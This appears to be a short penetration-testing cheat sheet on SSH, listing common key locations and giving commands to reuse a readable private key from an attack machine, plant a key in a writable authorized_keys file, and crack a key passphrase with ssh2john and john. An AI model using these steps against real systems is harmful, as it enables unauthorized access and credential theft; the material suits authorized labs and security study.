# SSH

In short SSH is a protocol to access remote systems securely over unsecure network.

To connect use `ssh user@ip`

SSH keys are generally stored at:
- /root/.ssh/
- /home/user_name/.ssh/ (users home directory)
- /etc/ssh/
- in the paths specified in the ssh_config or sshd_config config files

You can also find a ssh key in the backup

## Exploiting through SSH key

### Private key is readable

Suppose in the server the ssh key is readable to the user. He can copy it to the attack machine and connect to the remote server with that key. Before connecting change the read and write permissions of the copied keys. The whole process will be:
```console
──(kali㉿kali)-[~]
└─$ echo "copied private key" > id_rsa
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa user@ip
```

### Writable Public key

There is file name `authorized_keys` in `.ssh/` directory, it stores the keys which can log in the machine. If it is writable than you can add your own key. To add your key first generate it using `ssh-keygen` in attack machine. Then copy the public key from `id_rsa.pub` and add it to the `authorized_keys` in remote server. If connected through ssh than you can use `ssh-copy-id user_name@X.X.X.X` to add the public keys otherwise add manually using copy-paste. The whole process will be:
```console
ssh-keygen
ssh-copy-id user@ip
ssh -i id_rsa user@ip
```
**Manually add the key if not connected through ssh**

## Cracking ssh key hash using john

The passphrase of ssh key can be cracked using `john` if the passphrase is common and present in `rockyou.txt` or other dictionaries. Before cracking it with john we have to change the format for john for this we will use `ssh2john.py`. The whole process will be:
```console
cp $(locate rockyou.txt) .
python ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=rockyou.txt
```
